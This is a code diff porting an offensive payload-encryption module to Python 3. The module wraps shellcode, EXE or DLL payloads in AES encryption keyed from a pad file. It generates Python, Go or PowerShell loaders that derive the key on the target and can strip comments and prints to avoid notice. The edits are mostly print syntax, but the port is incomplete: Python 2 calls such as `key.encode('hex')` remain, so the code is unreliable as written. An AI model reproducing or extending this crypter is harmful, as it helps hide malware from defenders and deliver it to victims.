@@ -10,9 +10,8 @@ import os
 import platform
 from Crypto.Cipher import AES
 from Crypto import Random
-import StringIO
 import binascii
-
+from io import StringIO
 from templates.python import otp_symmetric_base
 from templates.python.payloads import pe_exe
 from templates.python.payloads import win_shellcode
@@ -35,7 +34,7 @@ class otp_key:
     def __init__(self, pad, payload, otp_type, payload_type, minus_bytes, scan_dir, output_type, key_iterations, pad_max, cleanup=False):
         self.org_payload = payload
         self.payload = open(payload, 'rb').read()
-        print "[*] Payload length", hex(len(self.payload))
+        print("[*] Payload length", hex(len(self.payload)))
         self.lookup_table = ''
         self.otp_type = otp_type
         self.payload_type = payload_type
@@ -53,20 +52,20 @@ class otp_key:
 
         if output_type in ['python', 'both']:
             if 'dll' in self.payload_type.lower():
-                print "[X] No DLL Support for python"
+                print("[X] No DLL Support for python")
                 sys.exit(-1)
-        print "[*] Using the following as an OTP:", self.pad
+        print("[*] Using the following as an OTP:", self.pad)
         if self.pad_max.startswith("0x"):
             self.pad_max = int(self.pad_max, 16)
         if self.pad_max > 256 ** 3 - 1:
-            print "[!] That's too big of a pad or you don't speak hex or int"
+            print("[!] That's too big of a pad or you don't speak hex or int")
             self.pad_max = 256 ** 3 -1
-        print "[*] Using a maximum pad size of:", hex(self.pad_max)
+        print("[*] Using a maximum pad size of:", hex(self.pad_max))
         self.hash_payload()
         self.find_key_encrypt()
         if self.output_type == 'python':
             if 'dll' in self.payload_type.lower():
-                print "[X] No DLL Support for python"
+                print("[X] No DLL Support for python")
                 sys.exit(-1)
             self.gen_pyloader()
         elif self.output_type == 'go':
@@ -75,16 +74,16 @@ class otp_key:
             self.gen_psloader()
 
     def set_payload(self):
-        print "[*] Payload_type", self.payload_type
+        print("[*] Payload_type", self.payload_type)
         if self.payload_type == "shellcode":
-            print '[*] Using shellcode payload template' 
+            print('[*] Using shellcode payload template')
             self.payload_loader = win_shellcode.loader
             self.go_payload_loader = go_win_shellcode.loader
             self.payload_imports = go_win_shellcode.imports
             self.ps_payload_loader = ps_win_shellcode.loader
 
         elif self.payload_type == "exe":
-            print '[*] Using EXE payload template' 
+            print('[*] Using EXE payload template')
             self.payload_loader = pe_exe.loader
             self.go_payload_loader = go_memorymodule.loader
             self.payload_imports = go_memorymodule.imports
@@ -92,7 +91,7 @@ class otp_key:
 
         elif self.payload_type == "dll_x86":
             # go memory module
-            print '[*] Using x86 dll payload template' 
+            print('[*] Using x86 dll payload template')
             #self.payload_loader = pe_dll_x86.loader
             self.go_payload_loader = go_memorymodule.loader
             self.payload_imports = go_memorymodule.imports
@@ -142,7 +141,7 @@ class otp_key:
         self.sizeofPad = len(open(self.pad, 'r').read(self.pad_max))
 
         self.key_len = random.randint(32, 256)
-        print '[*] Randomly chosen key source length between 32 and 256:', self.key_len
+        print('[*] Randomly chosen key source length between 32 and 256:', self.key_len)
         
         with open(self.pad, 'r') as f:
             while True:
@@ -150,7 +149,7 @@ class otp_key:
                 f.seek(random.randint(0, self.sizeofPad), 0)
                 self.location = f.tell()
                 if self.location + self.key_len >= self.sizeofPad:
-                    print "[!] File location for key too close to end of file, re-trying key"
+                    print("[!] File location for key too close to end of file, re-trying key")
                 else:
                     break
 
@@ -158,13 +157,13 @@ class otp_key:
             f.seek(self.location, 0)
             self.key = f.read(self.key_len)
     
-        print '[*] Location of key in file', hex(self.location)
+        print('[*] Location of key in file', hex(self.location))
 
         # Do a sha512 has of the key and trim the front 32 bytes (256 bits)
         #self.key = self.key_line
         key_iterations = self.key_iterations
         
-        print "[*] Applying %s sha512 hash iterations before encryption" % key_iterations
+        print("[*] Applying %s sha512 hash iterations before encryption" % key_iterations)
 
         while key_iterations > 1:
             
@@ -174,7 +173,7 @@ class otp_key:
 
         self.key = hashlib.sha512(self.key).digest()[:32]
         
-        print '[*] Encryption Key:', self.key.encode('hex'), base64.b64encode(self.key)
+        print('[*] Encryption Key:', self.key.encode('hex'), base64.b64encode(self.key))
         
         self.iv = Random.new().read(AES.block_size)
         
@@ -183,7 +182,7 @@ class otp_key:
             cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
             
             self.encrypted_msg = cipher.encrypt(self.payload)
-            print '[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest()
+            print('[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest())
             self.lookup_table = zlib.compress(struct.pack("<I", self.location) + struct.pack("<H", self.key_len) + self.iv + self.encrypted_msg)
 
             # Encrypt payload payload
@@ -192,7 +191,7 @@ class otp_key:
         # Gen go formated AES cipher
         
         elif self.output_type.lower() == 'go':
-            print "[*] Generating encrypted payload for the GO output (padding is different than python)"
+            print("[*] Generating encrypted payload for the GO output (padding is different than python)")
             go_block_size = 128
 
             gocipher = AES.new(
@@ -205,16 +204,16 @@ class otp_key:
 
             PADDING="{"
             # Normally you don't have to pad CFB, but go is CFB128 -- python is CFB8
-            print "\t[*] Length before padding and encoding:", len(self.payload)
+            print("\t[*] Length before padding and encoding:", len(self.payload))
             self.base64_encoded_payload = base64.b64encode(self.payload)
-            print "\t[*] Length after encoding:", len(self.base64_encoded_payload)
+            print("\t[*] Length after encoding:", len(self.base64_encoded_payload))
             self.payload = self.base64_encoded_payload + (go_block_size - len(self.base64_encoded_payload) % go_block_size) * PADDING
-            print "\t[*] Length after padding:", len(self.payload)
+            print("\t[*] Length after padding:", len(self.payload))
             self.go_encrypted_msg = gocipher.encrypt(self.payload)
             self.go_lookup_table = zlib.compress(struct.pack("<I", self.location) + struct.pack("<H", self.key_len) + self.iv + self.go_encrypted_msg)
 
         elif self.output_type == 'powershell':
-            print "in powershell"
+            print("in powershell")
             ps_block_size = 128
             pscipher = AES.new(self.key,
                                AES.MODE_CBC,
@@ -245,21 +244,21 @@ class otp_key:
         
         with open(r'./output/' + self.payload_name, 'w') as f:
             if "go_" in self.payload_name and self.cleanup:
-                print "[*] Removing Comments and Print Statements"
+                print("[*] Removing Comments and Print Statements")
                 self.payload_output = removeCommentsGo(self.payload_output,removePrint=True)
             elif "python_" in self.payload_name and self.cleanup:
-                print "[*] Removing Comments and Print Statements"
+                print("[*] Removing Comments and Print Statements")
                 self.payload_output = removeCommentsPy(self.payload_output,removePrint=True)
             elif self.payload_name and self.cleanup:
-                print "[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name)
+                print("[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name))
             f.write(self.payload_output)
 
 
     def gen_pyloader(self):
         self.payload_name = 'python_otp_key_' + os.path.basename(self.org_payload) + ".py"
-        print '[*] Payload hash (minus_bytes):', self.payload_hash
-        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
-        print "[*] Writing Python payload to:", self.payload_name
+        print('[*] Payload hash (minus_bytes):', self.payload_hash)
+        print('[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest())
+        print("[*] Writing Python payload to:", self.payload_name)
         
         self.payload_output = otp_symmetric_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, 
                                                              self.minus_bytes, self.payload_loader, 
@@ -288,9 +287,9 @@ class otp_key:
             for item in self.payload_imports: self.import_set.add(item)
 
         self.payload_name = "go_otp_key_" + os.path.basename(self.org_payload) + ".go"
-        print '[*] Payload hash (minus_bytes):', self.payload_hash
-        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
-        print '[*] Writing GO payload to:', self.payload_name
+        print('[*] Payload hash (minus_bytes):', self.payload_hash)
+        print('[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest())
+        print('[*] Writing GO payload to:', self.payload_name)
         
         go_imports = ''
 
@@ -304,12 +303,11 @@ class otp_key:
 
     def gen_psloader(self):
         self.payload_name = 'powershell_otp_key_' + os.path.basename(self.org_payload) + ".ps1"
-        print '[*] Payload hash (minus_bytes):', self.payload_hash
-        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
-        print "[*] Writing PowerShell payload to:", self.payload_name
+        print('[*] Payload hash (minus_bytes):', self.payload_hash)
+        print('[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest())
+        print("[*] Writing PowerShell payload to:", self.payload_name)
         
         self.payload_output = ps_otp_symmetric_base.buildcode.format(self.ps_lookup_table, self.payload_hash, 
                                                              self.minus_bytes, self.ps_payload_loader, 
                                                              self.scan_dir, self.key_iterations)
         self.write_payload()
-
